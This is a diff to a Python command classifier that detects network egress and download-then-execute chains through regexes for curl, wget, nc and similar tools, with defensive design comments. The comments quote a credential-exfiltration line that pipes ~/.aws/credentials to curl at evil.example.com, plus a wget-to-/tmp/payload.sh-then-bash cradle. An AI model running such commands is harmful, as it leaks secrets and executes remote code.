@@ -68,6 +68,143 @@ PROC_SUBST_EXEC = re.compile(
     re.IGNORECASE,
 )
 
+# Tools whose whole job is to move bytes off the box. Lives here rather than in
+# mitre.py so the mapper and the trait classifier cannot drift, which is the
+# lesson of #40.
+BARE_IP = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
+NETWORK_CLIENT = re.compile(
+    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod|nc|netcat|scp|rsync|ftp|telnet)\b",
+    re.IGNORECASE,
+)
+
+
+def reaches_remote_host(command: str) -> bool:
+    """True when the command names a target that is not this machine.
+
+    Loopback is not egress. Hitting your own health endpoint is the single most
+    common thing a developer does while running this tool, and counting it would
+    bury the one event that matters under a hundred that do not. Anything off
+    the box counts, including the LAN: exfil to the machine next to you is
+    still exfil.
+    """
+    hosts = URL_HOST.findall(command or "") + BARE_IP.findall(command or "")
+    return any(not LOOPBACK_HOST.match(h) for h in hosts)
+
+
+# A fetch that writes the response to a named file, from any host. The staged
+# half of a two-step cradle, and deliberately host-agnostic: STAGING_HOST is a
+# list of seven services, and registering a domain costs a few euros (#43).
+#
+# Host-agnostic only works because the *rule* additionally requires that the
+# file written here is the file executed later. Treating any remote fetch as
+# staging would fire on `curl -sO https://api.example.com/schema.json && python
+# generate.py`, which is a normal working day.
+# Deliberately not one regex. curl's download flags do not share a shape and a
+# single pattern got all of these wrong:
+#
+#   curl -o /tmp/x.sh URL     writes /tmp/x.sh          (flag takes an argument)
+#   curl -O URL               writes ./x.sh             (flag takes NONE; name
+#                                                        comes from the URL)
+#   curl -sO URL              same, combined short flags
+#   curl -fsSLo /tmp/y.sh URL same as -o, combined
+#   wget URL                  writes ./x.sh             (no flag at all)
+#
+# The first draft matched `-o|--output|-O|...` followed by a token, which missed
+# `-sO` and `-fsSLo` entirely and, for `curl -s -O URL`, captured the string
+# "https" as the filename. Case matters too: curl's `-o` and `-O` are different
+# flags, so these are the one place in this module that must not be IGNORECASE.
+_FETCH_OUTPUT_FLAG = re.compile(r"(?:^|\s)-[a-zA-Z]*o\s+(?P<path>[^\s|;&]+)")
+_FETCH_OUTFILE_FLAG = re.compile(r"(?:^|\s)(?:--output|-OutFile)\s+(?P<path>[^\s|;&]+)", re.IGNORECASE)
+_FETCH_REMOTE_NAME = re.compile(r"(?:^|\s)-[a-zA-Z]*O(?:\s|$)|--remote-name\b")
+_FETCH_URL = re.compile(r"https?://[^\s'\"|;&]+", re.IGNORECASE)
+_BARE_WGET = re.compile(r"\bwget\b", re.IGNORECASE)
+_CURL_CMD = re.compile(r"\bcurl\b", re.IGNORECASE)
+# wget's -O is the output document. Its lowercase -o is a logfile, so it is
+# deliberately absent here.
+_WGET_OUTPUT_FLAG = re.compile(r"(?:^|\s)(?:-[a-zA-Z]*O|--output-document(?:=|\s+))\s*(?P<path>[^\s|;&]+)")
+
+FETCH_TO_FILE = re.compile(
+    r"\b(?:curl|wget|iwr|invoke-webrequest)\b", re.IGNORECASE
+)
+
+# Running a named file through an interpreter or shell.
+EXECUTE_FILE = re.compile(
+    r"\b(?:bash|sh|zsh|dash|source|\.)\s+(?P<path>[\w./~\\-]+\.(?:sh|bash|zsh))\b|"
+    r"\b(?:python\d?|perl|ruby|node|deno|bun)\s+(?P<path2>[\w./~\\-]+\.(?:py|pl|rb|js|mjs|ts))\b|"
+    r"\bpowershell(?:\.exe)?\s+(?:-\w+\s+)*(?P<path3>[\w./~\\-]+\.ps1)\b|"
+    r"\bchmod\s+\+x\s+(?P<path4>[\w./~\\-]+)",
+    re.IGNORECASE,
+)
+
+
+def _basename(path: str) -> str:
+    return path.rsplit("/", 1)[-1].rsplit("\\", 1)[-1].split("?", 1)[0]
+
+
+def fetched_files(command: str) -> set[str]:
+    """Basenames a command downloads to disk, from any host.
+
+    Handled per tool, because curl and wget give the same two letters opposite
+    meanings and treating them alike produces the wrong filename rather than no
+    filename, which is the worse failure:
+
+        curl -o FILE URL    writes FILE
+        curl -O URL         writes the URL basename (flag takes no argument)
+        wget -O FILE URL    writes FILE
+        wget -o FILE URL    writes a LOG to FILE; the download still goes to
+                            the URL basename
+        wget URL            writes the URL basename
+
+    `wget -O /tmp/payload.sh https://host/readme.txt` is the case that made this
+    worth splitting: read as curl it yields `readme.txt`, the later
+    `bash /tmp/payload.sh` does not match, and the rule goes quiet.
+    """
+    text = command or ""
+    if not FETCH_TO_FILE.search(text):
+        return set()
+
+    found: set[str] = set()
+    url_names = {_basename(u) for u in _FETCH_URL.findall(text)}
+    url_names.discard("")
+
+    uses_wget = _BARE_WGET.search(text) is not None
+    uses_curl = _CURL_CMD.search(text) is not None
+
+    if uses_wget:
+        explicit = [
+            _basename(m.group("path")) for m in _WGET_OUTPUT_FLAG.finditer(text)
+        ]
+        explicit = [n for n in explicit if n and not n.startswith("-")]
+        found.update(explicit or url_names)
+
+    if uses_curl:
+        explicit = [
+            _basename(m.group("path")) for m in _FETCH_OUTPUT_FLAG.finditer(text)
+        ]
+        explicit = [n for n in explicit if n and not n.startswith("-")]
+        found.update(explicit)
+        if _FETCH_REMOTE_NAME.search(text):
+            found.update(url_names)
+
+    for m in _FETCH_OUTFILE_FLAG.finditer(text):  # PowerShell -OutFile
+        name = _basename(m.group("path"))
+        if name and not name.startswith("-"):
+            found.add(name)
+
+    return found
+
+
+def executed_files(command: str) -> set[str]:
+    """Basenames a command runs."""
+    found: set[str] = set()
+    for m in EXECUTE_FILE.finditer(command or ""):
+        for group in ("path", "path2", "path3", "path4"):
+            value = m.group(group)
+            if value:
+                found.add(value.rsplit("/", 1)[-1].rsplit("\\", 1)[-1])
+    return found
+
+
 # An interpreter that speaks HTTP is a network client, whatever it is called.
 # `_NETWORK_CLIENT` in mitre.py listed curl, wget, nc, scp and friends, so
 # `python -c "urllib.request.urlopen(...)"` carrying a file out was tagged
@@ -265,6 +402,8 @@ KNOWN_TRAITS = frozenset({
     "pr_merge",
     "credential_access",
     "private_key",
+    "net_egress",
+    "fetch_to_file",
 })
 
 
@@ -479,6 +618,22 @@ def classify_command(command: str) -> list[str]:
         traits.append("credential_access")
     if PRIVATE_KEY_PATH.search(literal):
         traits.append("private_key")
+
+    # Egress as a fact about one event. `credential-exfil` needed a *later*
+    # event tagged TA0011, so a command that both read a secret and sent it --
+    # `cat ~/.aws/credentials | curl -d @- https://evil.example.com` -- produced
+    # one credential-access event, no second half, and no finding (#42). One
+    # event can carry two facts; the technique field can only carry one, so the
+    # second one lives here.
+    if reaches_remote_host(spoken) and (
+        NETWORK_CLIENT.search(written) or INTERPRETER_NETWORK.search(literal)
+    ):
+        traits.append("net_egress")
+    # `fetched_files`, not `FETCH_TO_FILE`. The latter is only a tool-name gate
+    # since curl's download flags stopped fitting one pattern, and using it here
+    # labelled every remote `curl` as a download to disk.
+    if reaches_remote_host(spoken) and fetched_files(written):
+        traits.append("fetch_to_file")
 
     # The PR traits read `written`: a command that *writes* `gh pr merge` into a
     # file is not merging anything, and treating it as though it were fired
